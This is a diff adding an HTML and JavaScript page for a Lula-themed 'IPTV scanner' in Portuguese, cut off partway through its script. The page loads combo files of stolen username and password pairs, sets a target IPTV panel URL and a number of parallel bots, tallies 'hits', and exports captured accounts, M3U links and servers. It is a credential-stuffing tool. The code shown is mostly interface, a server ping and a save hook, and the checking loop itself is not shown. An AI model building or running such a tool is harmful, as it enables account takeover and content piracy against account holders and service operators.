@@ -1,0 +1,1504 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
+  <title> LULA IPTV SCANNER - O Brasil Sem Fome de Hits </title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+    }
+
+    body {
+      background-color: #0c0203;
+      color: #e2e2e2;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 15px;
+      overflow-x: hidden;
+    }
+
+    /* SPLASH SCREEN TEMA LULA */
+    #splash-screen {
+      position: fixed;
+      top: 0; left: 0; width: 100vw; height: 100vh;
+      background-color: #120305;
+      z-index: 10000;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      transition: opacity 0.6s ease, visibility 0.6s;
+    }
+
+    .splash-logo-container {
+      text-align: center;
+      margin-bottom: 25px;
+      animation: pulseLogo 2s infinite ease-in-out;
+    }
+
+    .splash-lula-img {
+      width: 110px;
+      height: 110px;
+      border-radius: 50%;
+      border: 3px solid #ff1a1a;
+      box-shadow: 0 0 20px rgba(230, 0, 0, 0.8);
+      object-fit: cover;
+      margin-bottom: 12px;
+    }
+
+    @keyframes pulseLogo {
+      0%, 100% { transform: scale(1); opacity: 0.9; }
+      50% { transform: scale(1.05); opacity: 1; filter: drop-shadow(0 0 20px rgba(230, 0, 0, 0.9)); }
+    }
+
+    .splash-title {
+      font-size: 2.2rem;
+      font-weight: 900;
+      color: #ffffff;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      background: linear-gradient(135deg, #ff1a1a, #ff6666);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .splash-subtitle {
+      font-size: 0.85rem;
+      color: #ff3333;
+      font-weight: bold;
+      letter-spacing: 4px;
+      text-transform: uppercase;
+      margin-top: 5px;
+      text-shadow: 0 0 15px rgba(255, 0, 0, 0.4);
+    }
+
+    .splash-loading-box {
+      width: 260px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .splash-bar-bg {
+      width: 100%;
+      height: 6px;
+      background: #20080a;
+      border-radius: 10px;
+      overflow: hidden;
+      border: 1px solid #3d0c10;
+      box-shadow: inset 0 1px 3px rgba(0,0,0,0.5);
+    }
+
+    .splash-bar-fill {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, #cc0000, #ff4d4d);
+      box-shadow: 0 0 10px #ff0000;
+      border-radius: 10px;
+      transition: width 0.1s linear;
+    }
+
+    .splash-txt {
+      font-size: 0.72rem;
+      color: #a37276;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    /* CONTAINER PRINCIPAL */
+    .hithunter-shell {
+      width: 100%;
+      max-width: 480px;
+      background-color: #1a0507;
+      border-radius: 28px;
+      padding: 22px;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.9), inset 0 1px 2px rgba(255,255,255,0.05);
+      border: 1px solid #3a0d11;
+      position: relative;
+      margin-bottom: 80px;
+    }
+
+    .app-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 18px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid #3a0d11;
+    }
+
+    .brand-box { display: flex; flex-direction: column; }
+    .brand-title {
+      color: #ffffff;
+      font-weight: 900;
+      font-size: 1.4rem;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      background: linear-gradient(180deg, #ffffff 0%, #ff8080 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .brand-subtitle { font-size: 0.7rem; color: #ff3333; font-weight: 800; letter-spacing: 1px; }
+
+    .badge-free {
+      background: linear-gradient(180deg, #400a0e 0%, #220406 100%);
+      color: #ff4d4d;
+      font-size: 0.65rem;
+      padding: 6px 12px;
+      border-radius: 8px;
+      font-weight: bold;
+      border: 1px solid #5e1117;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.4);
+    }
+
+    /* BANNER ANIMADO DO LULA */
+    .lula-banner-card {
+      background: linear-gradient(135deg, #3d0509 0%, #1c0204 100%);
+      border: 1px solid #660f17;
+      border-radius: 18px;
+      padding: 12px;
+      margin-bottom: 18px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      overflow: hidden;
+      position: relative;
+      box-shadow: 0 4px 15px rgba(230, 0, 0, 0.2);
+    }
+
+    .lula-face-anim {
+      width: 65px;
+      height: 65px;
+      border-radius: 50%;
+      border: 2px solid #ff3333;
+      object-fit: cover;
+      animation: lulaPulse 2.5s infinite ease-in-out;
+      flex-shrink: 0;
+    }
+
+    @keyframes lulaPulse {
+      0% { transform: scale(1) rotate(0deg); box-shadow: 0 0 5px #ff0000; }
+      50% { transform: scale(1.08) rotate(3deg); box-shadow: 0 0 18px #ff3333; }
+      100% { transform: scale(1) rotate(0deg); box-shadow: 0 0 5px #ff0000; }
+    }
+
+    .lula-quote-box {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .lula-quote-title {
+      font-size: 0.75rem;
+      color: #ff4d4d;
+      font-weight: bold;
+      text-transform: uppercase;
+      margin-bottom: 2px;
+    }
+
+    .lula-quote-text {
+      font-size: 0.7rem;
+      color: #f0e0e2;
+      font-style: italic;
+      line-height: 1.2;
+    }
+
+    /* NAVEGAÇÃO */
+    .nav-tabs {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      background: #140304;
+      padding: 5px;
+      border-radius: 14px;
+      margin-bottom: 22px;
+      border: 1px solid #330a0d;
+      box-shadow: inset 0 2px 5px rgba(0,0,0,0.6);
+    }
+
+    .tab-item {
+      padding: 12px;
+      text-align: center;
+      font-size: 0.8rem;
+      font-weight: bold;
+      color: #a37276;
+      cursor: pointer;
+      border-radius: 10px;
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .tab-item.active {
+      background: linear-gradient(180deg, #cc0000 0%, #800000 100%);
+      color: #ffffff;
+      box-shadow: 0 4px 12px rgba(204, 0, 0, 0.4), inset 0 1px 1px rgba(255,255,255,0.2);
+      text-shadow: 0 1px 2px rgba(0,0,0,0.4);
+    }
+
+    .view-panel { display: none; }
+    .view-panel.active-view { display: block; }
+
+    .panel-card {
+      background: linear-gradient(180deg, #200508 0%, #150305 100%);
+      border: 1px solid #3a0d11;
+      border-radius: 18px;
+      padding: 18px;
+      margin-bottom: 18px;
+      box-shadow: 0 6px 16px rgba(0,0,0,0.5);
+    }
+
+    .card-title {
+      font-size: 0.72rem;
+      text-transform: uppercase;
+      color: #ff3333;
+      font-weight: bold;
+      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-bottom: 14px;
+    }
+
+    .input-wrapper {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      margin-bottom: 14px;
+    }
+
+    .input-label {
+      font-size: 0.68rem;
+      color: #a37276;
+      font-weight: bold;
+      text-transform: uppercase;
+    }
+
+    .field-row {
+      display: flex;
+      align-items: center;
+      background: #0f0203;
+      border: 1px solid #330a0d;
+      border-radius: 12px;
+      padding: 0 14px;
+      box-shadow: inset 0 2px 4px rgba(0,0,0,0.5);
+      transition: border-color 0.2s;
+    }
+    .field-row:focus-within {
+      border-color: #ff1a1a;
+    }
+
+    .field-row i { color: #ff3333; font-size: 0.85rem; }
+
+    .input-dark {
+      background: transparent;
+      border: none;
+      color: #ffffff;
+      padding: 12px 8px;
+      font-size: 0.82rem;
+      width: 100%;
+      outline: none;
+    }
+    .input-dark::placeholder {
+      color: #613b3e;
+    }
+
+    .field-row.nick-field {
+      background: #0f0203;
+      border: 1px solid #330a0d;
+    }
+    .field-row.nick-field:focus-within {
+      border-color: #ff1a1a;
+    }
+    .field-row.nick-field i {
+      color: #ff3333;
+    }
+    .input-dark.nick-input {
+      color: #ffffff;
+    }
+    .input-dark.nick-input::placeholder {
+      color: #613b3e;
+    }
+
+    .status-ping-badge {
+      font-size: 0.65rem;
+      font-weight: 900;
+      padding: 4px 10px;
+      border-radius: 6px;
+      text-transform: uppercase;
+      white-space: nowrap;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .status-ping-badge.checking { background: #22080a; color: #a37276; border: 1px solid #3d1014; }
+    .status-ping-badge.online { background: rgba(0, 255, 102, 0.12); color: #00ff66; border: 1px solid rgba(0,255,102,0.4); text-shadow: 0 0 4px rgba(0,255,102,0.5); }
+    .status-ping-badge.offline { background: rgba(255, 59, 48, 0.12); color: #ff3b30; border: 1px solid rgba(255,59,48,0.4); }
+
+    .categories-selector-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 8px;
+    }
+
+    .btn-cat-toggle {
+      background: linear-gradient(180deg, #29080a 0%, #170305 100%);
+      border: 1px solid #400f13;
+      color: #a37276;
+      padding: 12px 4px;
+      border-radius: 12px;
+      font-size: 0.75rem;
+      font-weight: bold;
+      cursor: pointer;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      box-shadow: 0 3px 6px rgba(0,0,0,0.3), inset 0 1px 0 rgba(255,255,255,0.05);
+      transition: all 0.15s ease;
+    }
+
+    .btn-cat-toggle:active {
+      transform: translateY(1px);
+      box-shadow: 0 1px 2px rgba(0,0,0,0.5);
+    }
+
+    .btn-cat-toggle.active {
+      border-color: #ff1a1a;
+      background: linear-gradient(180deg, rgba(230, 0, 0, 0.3) 0%, rgba(230, 0, 0, 0.08) 100%);
+      color: #ffffff;
+      box-shadow: 0 0 10px rgba(255,0,0,0.2), inset 0 1px 1px rgba(255,0,0,0.3);
+    }
+
+    .btn-cat-toggle i.check-icon { font-size: 0.65rem; color: #ff3333; }
+
+    .combo-duplo-container {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+    }
+
+    .combo-box-individual {
+      background: #0f0203;
+      border: 1px solid #330a0d;
+      border-radius: 12px;
+      padding: 12px;
+    }
+
+    .combo-box-individual .combo-title {
+      font-size: 0.7rem;
+      color: #ff3333;
+      font-weight: bold;
+      text-transform: uppercase;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .combo-box-individual .combo-file-list {
+      min-height: 60px;
+      max-height: 100px;
+      overflow-y: auto;
+    }
+
+    .combo-box-individual .combo-file-list .file-chip-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: #1a0406;
+      border: 1px solid #3d0d11;
+      padding: 4px 8px;
+      border-radius: 6px;
+      margin-bottom: 4px;
+      font-size: 0.65rem;
+    }
+    .combo-box-individual .combo-file-list .file-chip-item span { 
+      color: #ff4d4d; 
+      font-weight: bold; 
+    }
+
+    .combo-box-individual .btn-add-combo {
+      width: 100%;
+      margin-top: 6px;
+      padding: 6px;
+      font-size: 0.65rem;
+      background: linear-gradient(180deg, #330a0d 0%, #1f0406 100%);
+      border: 1px solid #4a1116;
+      color: #d1b8ba;
+      border-radius: 8px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 4px;
+      transition: all 0.2s;
+    }
+
+    .combo-box-individual .btn-add-combo:hover {
+      background: linear-gradient(180deg, #400d11 0%, #290609 100%);
+      color: #fff;
+    }
+
+    .combo-box-individual .combo-count {
+      font-size: 0.6rem;
+      color: #a37276;
+      text-align: right;
+      margin-top: 4px;
+    }
+
+    .btn-limpar-combo {
+      background: linear-gradient(180deg, #38080a 0%, #1f0405 100%);
+      border: 1px solid #520e11;
+      color: #ff6b6b;
+      padding: 2px 8px;
+      font-size: 0.6rem;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-left: auto;
+    }
+
+    .btn-limpar-combo:hover {
+      background: linear-gradient(180deg, #4d0c0f 0%, #2e0608 100%);
+    }
+
+    .no-files-txt { 
+      text-align: center; 
+      color: #613b3e; 
+      font-size: 0.7rem; 
+      padding: 10px 0; 
+    }
+
+    .server-status-bar {
+      display: flex; justify-content: space-between; align-items: center;
+      font-size: 0.75rem; margin-bottom: 12px; border-bottom: 1px solid #3a0d11; padding-bottom: 8px;
+    }
+    .target-url-display { color: #ffffff; font-weight: bold; letter-spacing: 0.5px; }
+
+    .stats-dashboard { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; text-align: center; }
+    
+    .stat-box {
+      background: #0f0203; border: 1px solid #330a0d; border-radius: 12px; padding: 12px 2px;
+      box-shadow: inset 0 1px 3px rgba(0,0,0,0.6);
+    }
+    .stat-box.hit-box { border-color: #00ff66; background: rgba(0, 255, 102, 0.02); }
+    .stat-num { font-size: 0.85rem; font-weight: bold; font-family: monospace; color: #ffffff; }
+    .stat-lbl { font-size: 0.6rem; color: #82585c; text-transform: uppercase; margin-top: 3px; font-weight: bold; }
+    .hit-box .stat-num { color: #00ff66; text-shadow: 0 0 6px rgba(0,255,102,0.4); }
+
+    .hits-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
+    .count-badge { background: #00ff66; color: #000; font-size: 0.65rem; font-weight: 900; padding: 2px 8px; border-radius: 10px; }
+    
+    .hits-list-container { max-height: 250px; overflow-y: auto; display: flex; flex-direction: column; gap: 6px; }
+    
+    .hit-row-item {
+      background: #0f0203; border: 1px solid #330a0d; border-radius: 12px; padding: 12px;
+      display: flex; justify-content: space-between; align-items: center; cursor: pointer;
+    }
+    .hit-username { font-size: 0.8rem; font-weight: bold; color: #fff; }
+    .hit-sub-server { font-size: 0.65rem; color: #82585c; margin-top: 2px; }
+    .status-dot { width: 8px; height: 8px; background-color: #00ff66; border-radius: 50%; box-shadow: 0 0 6px #00ff66; }
+
+    .hit-template-details {
+      display: none; background: #080102; border: 1px dashed #4a1116; border-top: none;
+      margin-top: -10px; margin-bottom: 6px; padding: 12px; border-radius: 0 0 12px 12px;
+      font-family: 'Courier New', monospace; font-size: 0.65rem; white-space: pre-wrap; color: #00ff66;
+      max-height: 400px; overflow-y: auto;
+    }
+
+    .fab-engine-control {
+      position: fixed; bottom: 25px; right: calc(50% - 215px);
+      width: 58px; height: 58px;
+      background: linear-gradient(180deg, #e60000 0%, #800000 100%);
+      border: 1px solid #ff4d4d; border-radius: 50%;
+      color: #fff; font-size: 1.2rem; display: flex; align-items: center; justify-content: center;
+      cursor: pointer;
+      box-shadow: 0 6px 20px rgba(204, 0, 0, 0.6), inset 0 1px 2px rgba(255,255,255,0.3);
+      z-index: 999;
+      transition: transform 0.1s ease, background 0.2s;
+    }
+
+    @media (max-width: 520px) { .fab-engine-control { right: 20px; } }
+
+    .fab-engine-control:active { transform: scale(0.94); }
+
+    .fab-engine-control.idle-state {
+      background: linear-gradient(180deg, #2bc74c 0%, #19752c 100%);
+      border-color: #4cd964;
+      box-shadow: 0 6px 20px rgba(25, 117, 44, 0.5), inset 0 1px 2px rgba(255,255,255,0.3);
+    }
+
+    .empty-msg { text-align: center; color: #613b3e; font-size: 0.72rem; padding: 20px 0; }
+
+    .btn-action-sub {
+      background: linear-gradient(180deg, #330a0d 0%, #1f0406 100%);
+      border: 1px solid #4a1116;
+      color: #d1b8ba;
+      padding: 11px;
+      font-size: 0.75rem;
+      font-weight: bold;
+      border-radius: 10px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      box-shadow: 0 3px 5px rgba(0,0,0,0.4);
+    }
+    .btn-action-sub:hover { background: linear-gradient(180deg, #400d11 0%, #290609 100%); color: #fff; }
+  </style>
+<script>
+(function(){
+  'use strict';
+  function androidSave(name, text) {
+    name = String(name || ('hits_' + Date.now() + '.txt'));
+    text = String(text == null ? '' : text);
+    if (window.AndroidSave && typeof AndroidSave.saveFile === 'function') {
+      AndroidSave.saveFile(name, text);
+      return true;
+    }
+    return false;
+  }
+  function saveAnchor(a) {
+    if (!a || !a.href || !window.AndroidSave) return false;
+    var name = a.download || 'resultados_' + Date.now() + '.txt';
+    if (a.href.indexOf('blob:') === 0) {
+      fetch(a.href).then(function(r){ return r.text(); }).then(function(t){ androidSave(name, t); });
+      return true;
+    }
+    if (a.href.indexOf('data:') === 0) {
+      try {
+        var part = a.href.split(',')[1] || '';
+        androidSave(name, decodeURIComponent(part));
+        return true;
+      } catch(e) {}
+    }
+    return false;
+  }
+  window.saveText = androidSave;
+  window.downloadText = androidSave;
+  window.saveHitsToAndroid = function(text, name){ return androidSave(name, text); };
+  window.saveResultsToAndroid = function(text, name){ return androidSave(name || 'resultados.txt', text); };
+
+  if (window.HTMLAnchorElement) {
+    var oldClick = HTMLAnchorElement.prototype.click;
+    HTMLAnchorElement.prototype.click = function(){
+      if (this.download && saveAnchor(this)) return;
+      return oldClick.call(this);
+    };
+  }
+  document.addEventListener('click', function(ev){
+    var a = ev.target && ev.target.closest ? ev.target.closest('a[download]') : null;
+    if (a && saveAnchor(a)) { ev.preventDefault(); ev.stopPropagation(); }
+  }, true);
+
+  function hook(name) {
+    var fn = window[name];
+    if (typeof fn !== 'function' || fn.__androidHook) return;
+    var wrapped = function(){
+      var args = Array.prototype.slice.call(arguments);
+      if (name === 'saveAs' && args[0] && typeof args[0].text === 'function') {
+        args[0].text().then(function(t){ androidSave(args[1] || 'resultados.txt', t); });
+        return;
+      }
+      var content = null, filename = null;
+      args.forEach(function(x){
+        if (typeof x !== 'string') return;
+        if (!filename && /\.(txt|csv|json|log)$/i.test(x)) filename = x;
+        if (!content && (x.indexOf('\n') >= 0 || x.length > 120)) content = x;
+      });
+      if (content && /^(download|export|save)/i.test(name)) {
+        androidSave(filename || 'resultados_' + Date.now() + '.txt', content);
+        return true;
+      }
+      return fn.apply(this, args);
+    };
+    wrapped.__androidHook = true;
+    window[name] = wrapped;
+  }
+  ['saveAs','download','exportData','saveHits','saveResults','exportResults','saveHitsToDevicePerDomain'].forEach(hook);
+  setInterval(function(){
+    ['saveAs','download','exportData','saveHits','saveResults','exportResults','saveHitsToDevicePerDomain'].forEach(hook);
+  }, 700);
+})();
+</script>
+</head>
+<body>
+
+<div id="splash-screen">
+  <div class="splash-logo-container">
+    <img src="https://i.postimg.cc/v8kRGZjj/file-000000000e3481f5826e3edf14c485d9.png" class="splash-lula-img" alt="Lula">
+    <h1 class="splash-title">LULA IPTV</h1>
+    <p class="splash-subtitle">FAZ O L NOS HITS</p>
+  </div>
+  <div class="splash-loading-box">
+    <div class="splash-bar-bg">
+      <div class="splash-bar-fill" id="splashBar"></div>
+    </div>
+    <span class="splash-txt" id="splashPercent">0%</span>
+  </div>
+</div>
+
+<div class="hithunter-shell">
+  
+  <header class="app-header">
+    <div class="brand-box">
+      <span class="brand-title">Lula IPTV Pro</span>
+      <span class="brand-subtitle">SCANNER DO POVO</span>
+    </div>
+    <div class="badge-free"><i class="fas fa-star"></i> NÚMERO 13</div>
+  </header>
+
+  <!-- BANNER ANIMADO COM FOTO DO LULA E FRASES -->
+  <div class="lula-banner-card">
+    <img src="https://i.postimg.cc/v8kRGZjj/file-000000000e3481f5826e3edf14c485d9.png" class="lula-face-anim" alt="Lula Face">
+    <div class="lula-quote-box">
+      <span class="lula-quote-title">Companheiro Lula diz:</span>
+      <span class="lula-quote-text" id="lulaBannerQuote">"Nunca antes na história deste país se testou tanto M3U!"</span>
+    </div>
+  </div>
+
+  <div class="nav-tabs">
+    <div class="tab-item active" id="tabMultiServidor"><i class="fas fa-server"></i> Multi Servidor</div>
+    <div class="tab-item" id="tabMultiCombo"><i class="fas fa-layer-group"></i> Multi Combo</div>
+  </div>
+
+  <!-- ABA 1: MULTI SERVIDOR -->
+  <div class="view-panel active-view" id="panelMultiServidor">
+    <div class="panel-card">
+      <div class="card-title"><i class="fas fa-hdd"></i> Configuração Manual do Servidor</div>
+      
+      <div class="input-wrapper" style="margin-top:10px;">
+        <span class="input-label">URL do Servidor Alvo</span>
+        <div class="field-row">
+          <i class="fas fa-link"></i>
+          <input type="text" id="targetServer" class="input-dark" placeholder="http://exemplo.com:80">
+          <span class="status-ping-badge checking" id="pingBadge"><i class="fas fa-clock"></i> Vazio</span>
+        </div>
+      </div>
+
+      <div class="input-wrapper">
+        <span class="input-label">Threads / Limite de Bots</span>
+        <div class="field-row">
+          <i class="fas fa-robot"></i>
+          <input type="number" id="botCountInput" class="input-dark" value="20">
+        </div>
+      </div>
+
+      <div class="input-wrapper">
+        <span class="input-label">Assinatura no Relatório (Nick)</span>
+        <div class="field-row nick-field">
+          <i class="fas fa-signature"></i>
+          <input type="text" id="guerreiroNick" class="input-dark nick-input" placeholder="Digite seu Nick..." style="color:#ffffff;">
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ABA 2: MULTI COMBO -->
+  <div class="view-panel" id="panelMultiCombo">
+    <div class="panel-card">
+      <div class="input-wrapper">
+        <span class="input-label">Host M3U Alvo</span>
+        <div class="field-row">
+          <i class="fas fa-network-wired"></i>
+          <input type="text" id="hostM3uCombo" class="input-dark" placeholder="http://exemplo.com:80">
+        </div>
+      </div>
+
+      <div class="input-wrapper">
+        <span class="input-label">Bots em Paralelo</span>
+        <div class="field-row">
+          <i class="fas fa-bolt"></i>
+          <input type="number" id="botComboInput" class="input-dark" value="5">
+        </div>
+      </div>
+
+      <div class="input-wrapper">
+        <span class="input-label">Categorias para Capturar</span>
+        <div class="categories-selector-grid">
+          <button class="btn-cat-toggle active" id="catCanais" onclick="toggleCategory('canais')">
+            <i class="fas fa-tv"></i> Canais <i class="fas fa-check-circle check-icon"></i>
+          </button>
+          <button class="btn-cat-toggle active" id="catFilmes" onclick="toggleCategory('filmes')">
+            <i class="fas fa-film"></i> Filmes <i class="fas fa-check-circle check-icon"></i>
+          </button>
+          <button class="btn-cat-toggle active" id="catSeries" onclick="toggleCategory('series')">
+            <i class="fas fa-video"></i> Séries <i class="fas fa-check-circle check-icon"></i>
+          </button>
+        </div>
+      </div>
+
+      <div class="input-wrapper">
+        <span class="input-label">Arquivos de Combo (Máx 2)</span>
+        <div class="combo-duplo-container">
+          <!-- Combo 1 -->
+          <div class="combo-box-individual" id="comboBox1">
+            <div class="combo-title">
+              <i class="fas fa-file-alt"></i> Combo #1
+              <button class="btn-limpar-combo" onclick="clearCombo(1)">Limpar</button>
+            </div>
+            <div class="combo-file-list" id="comboList1">
+              <div class="no-files-txt">Nenhum arquivo</div>
+            </div>
+            <button class="btn-add-combo" onclick="addCombo(1)">
+              <i class="fas fa-upload"></i> Adicionar
+            </button>
+            <div class="combo-count" id="comboCount1">0 contas</div>
+          </div>
+
+          <!-- Combo 2 -->
+          <div class="combo-box-individual" id="comboBox2">
+            <div class="combo-title">
+              <i class="fas fa-file-alt"></i> Combo #2
+              <button class="btn-limpar-combo" onclick="clearCombo(2)">Limpar</button>
+            </div>
+            <div class="combo-file-list" id="comboList2">
+              <div class="no-files-txt">Nenhum arquivo</div>
+            </div>
+            <button class="btn-add-combo" onclick="addCombo(2)">
+              <i class="fas fa-upload"></i> Adicionar
+            </button>
+            <div class="combo-count" id="comboCount2">0 contas</div>
+          </div>
+        </div>
+        <input type="file" id="multiComboHidden" accept=".txt" style="display:none;">
+      </div>
+    </div>
+  </div>
+
+  <!-- PAINEL MONITOR GLOBAL -->
+  <div class="panel-card">
+    <div class="server-status-bar">
+      <span class="target-url-display" id="displayHost">Aguardando servidor...</span>
+      <div style="color:#a37276; font-weight: bold; font-size:0.7rem;"><i class="fas fa-stopwatch"></i> Tempo: <span id="liveTimer">0s</span></div>
+    </div>
+
+    <div class="stats-dashboard">
+      <div class="stat-box">
+        <span class="stat-num" id="statTotal">0/0</span>
+        <span class="stat-lbl">Total</span>
+      </div>
+      <div class="stat-box hit-box">
+        <span class="stat-num" id="statHits">0</span>
+        <span class="stat-lbl">Hits</span>
+      </div>
+      <div class="stat-box">
+        <span class="stat-num" id="statCPM">0</span>
+        <span class="stat-lbl">CPM</span>
+      </div>
+      <div class="stat-box">
+        <span class="stat-num" id="statRetries">0</span>
+        <span class="stat-lbl">Retornos</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- CONTAINER DE HITS -->
+  <div class="panel-card">
+    <div class="hits-header">
+      <div class="card-title" style="margin:0;"><i class="fas fa-folder-open"></i> Contas Encontradas</div>
+      <span class="count-badge" id="hitBadgeCount">0</span>
+    </div>
+    <div class="hits-list-container" id="hitsCollectionLog">
+      <div class="empty-msg" id="emptyMsgLabel">> Aguardando o povo testar...</div>
+    </div>
+    <div style="text-align:right; margin-top:12px;">
+      <button id="downloadHitsBtn" class="btn-action-sub" style="display:inline-flex; width:auto; padding:6px 14px; font-size:0.68rem;">Exportar Resultados (.txt)</button>
+    </div>
+  </div>
+
+  <!--  PAINEL DE EXTRAÇÃO - TEMA LULA -->
+  <div class="panel-card">
+    <div class="card-title"><i class="fas fa-toolbox"></i> Extração de Dados</div>
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
+      <button id="extractComboBtn" class="btn-action-sub" style="padding:10px 6px; font-size:0.68rem;">
+        <i class="fas fa-key"></i> Extrair Combo
+      </button>
+      <button id="extractM3UBtn" class="btn-action-sub" style="padding:10px 6px; font-size:0.68rem;">
+        <i class="fas fa-link"></i> Extrair M3U
+      </button>
+      <button id="extractServersBtn" class="btn-action-sub" style="padding:10px 6px; font-size:0.68rem;">
+        <i class="fas fa-server"></i> Extrair Servidores
+      </button>
+      <button id="extractFullReportBtn" class="btn-action-sub" style="padding:10px 6px; font-size:0.68rem;">
+        <i class="fas fa-file-export"></i> Relatório Completo
+      </button>
+    </div>
+    <div style="text-align:center; margin-top:10px; font-size:0.65rem; color:#a37276;">
+      <i class="fas fa-info-circle"></i> Hits disponíveis: 
+      <span id="lulaExtractCount" style="color:#00ff66; font-weight:900;">0</span>
+    </div>
+  </div>
+
+</div>
+
+<button class="fab-engine-control idle-state" id="engineActionBtn">
+  <i class="fas fa-play" id="btnIcon"></i>
+</button>
+
+<script>
+  let currentTypedServer = "";
+  let comboData = { 1: [], 2: [] };
+  let comboFileNames = { 1: null, 2: null };
+  let comboAddTarget = null;
+
+  // FRASES DO LULA PARA O BANNER E HITS
+  const lulaPhrases = [
+    "\"Nunca antes na história deste país se testou tanto M3U!\"",
+    "\"O povo brasileiro tem o direito de assistir seu futebol em paz!\"",
+    "\"A picanha e a cervejinha gelada combinam perfeitamente com esse hit!\"",
+    "\"Esse hit aqui é investimento para a família brasileira!\"",
+    "\"Nós vamos garantir lista rodando sem travar para todo o Brasil!\"",
+    "\"Companheiro, coloque a picanha na grelha que essa conta tá rodando!\""
+  ];
+
+  // Alterna as frases do banner
+  let quoteIndex = 0;
+  setInterval(() => {
+    quoteIndex = (quoteIndex + 1) % lulaPhrases.length;
+    const qEl = document.getElementById('lulaBannerQuote');
+    if(qEl) qEl.innerText = lulaPhrases[quoteIndex];
+  }, 5000);
+
+  // SPLASH SCREEN
+  window.addEventListener('DOMContentLoaded', () => {
+    const splash = document.getElementById('splash-screen');
+    const fill = document.getElementById('splashBar');
+    const text = document.getElementById('splashPercent');
+    let progress = 0;
+
+    let interval = setInterval(() => {
+      progress += Math.floor(Math.random() * 9) + 5;
+      if(progress >= 100) {
+        progress = 100;
+        clearInterval(interval);
+        fill.style.width = '100%';
+        text.innerText = '100%';
+        setTimeout(() => {
+          splash.style.opacity = '0';
+          splash.style.visibility = 'hidden';
+        }, 350);
+      } else {
+        fill.style.width = `${progress}%`;
+        text.innerText = `${progress}%`;
+      }
+    }, 90);
+  });
+
+  // SERVER SYNC
+  const targetServerInput = document.getElementById('targetServer');
+  const hostM3uComboInput = document.getElementById('hostM3uCombo');
+  const pingBadge = document.getElementById('pingBadge');
+  const displayHost = document.getElementById('displayHost');
+  let typingTimer;
+
+  function syncServerValues(val) {
+    currentTypedServer = val.trim();
+    targetServerInput.value = currentTypedServer;
+    hostM3uComboInput.value = currentTypedServer;
+
+    if(!currentTypedServer) {
+      displayHost.innerText = "Aguardando servidor...";
+      pingBadge.className = "status-ping-badge checking";
+      pingBadge.innerHTML = `<i class="fas fa-clock"></i> Vazio`;
+      return;
+    }
+
+    try { displayHost.innerText = new URL(currentTypedServer).hostname; } 
+    catch { displayHost.innerText = currentTypedServer; }
+
+    clearTimeout(typingTimer);
+    pingBadge.className = "status-ping-badge checking";
+    pingBadge.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Digitando...`;
+    
+    typingTimer = setTimeout(triggerRealServerCheck, 600);
+  }
+
+  targetServerInput.addEventListener('input', (e) => syncServerValues(e.target.value));
+  hostM3uComboInput.addEventListener('input', (e) => syncServerValues(e.target.value));
+
+  async function triggerRealServerCheck() {
+    if(!currentTypedServer || !currentTypedServer.startsWith("http")) {
+      pingBadge.className = "status-ping-badge offline";
+      pingBadge.innerHTML = `<i class="fas fa-exclamation-triangle"></i> URL Inválida`;
+      return;
+    }
+
+    pingBadge.className = "status-ping-badge checking";
+    pingBadge.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> Testando...`;
+
+    try {
+      const controller = new AbortController();
+      const id = setTimeout(() => controller.abort(), 5000);
+      await fetch(`${currentTypedServer}/player_api.php`, { mode: 'no-cors', signal: controller.signal });
+      clearTimeout(id);
+      pingBadge.className = "status-ping-badge online";
+      pingBadge.innerHTML = `<i class="fas fa-check-circle"></i> Online`;
+    } catch (err) {
+      pingBadge.className = "status-ping-badge offline";
+      pingBadge.innerHTML = `<i class="fas fa-times-circle"></i> Offline`;
+    }
+  }
+
+  // ABAS
+  const tabMultiServidor = document.getElementById('tabMultiServidor');
